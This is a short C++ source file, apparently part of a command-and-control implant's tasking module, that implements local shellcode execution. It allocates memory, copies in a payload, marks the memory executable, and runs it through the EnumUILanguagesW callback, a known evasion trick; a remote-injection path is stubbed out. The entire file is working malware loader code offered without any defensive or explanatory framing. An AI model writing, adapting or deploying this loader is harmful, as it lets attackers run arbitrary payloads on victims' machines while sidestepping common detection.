//
// Created by diago on 2024-05-27.
//

#include "injection.hpp"

std::string
tasking::simple_self_inject(void const* payload, const uint32_t payload_size) {

    void* alloc_pages = VirtualAlloc(
        nullptr,
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if(alloc_pages == nullptr) {
        return io::win32_failure("run_shellcode", "VirtualAlloc");
    }

    std::memcpy(alloc_pages, payload, payload_size);
    uint32_t old_protect = 0;

    if(!VirtualProtect(
        alloc_pages,
        payload_size,
        PAGE_EXECUTE_READWRITE,
        reinterpret_cast<PDWORD>(&old_protect)
    )) {
        return io::win32_failure("run_shellcode", "VirtualProtect");
    }

    if(!EnumUILanguagesW(
        reinterpret_cast<UILANGUAGE_ENUMPROCW>(alloc_pages),
        MUI_LANGUAGE_NAME,
        0
    )) {
        return io::win32_failure("run_shellcode", "EnumUILanguagesW");
    }

    return "successfully ran shellcode.";
}


std::string
tasking::run_shellcode(const uint32_t pid, const std::string& shellcode_buffer) {
    if(pid == GetCurrentProcessId()) {
        return simple_self_inject(shellcode_buffer.data(), shellcode_buffer.size());
    }
    return "we don't have remote injection rn.";
}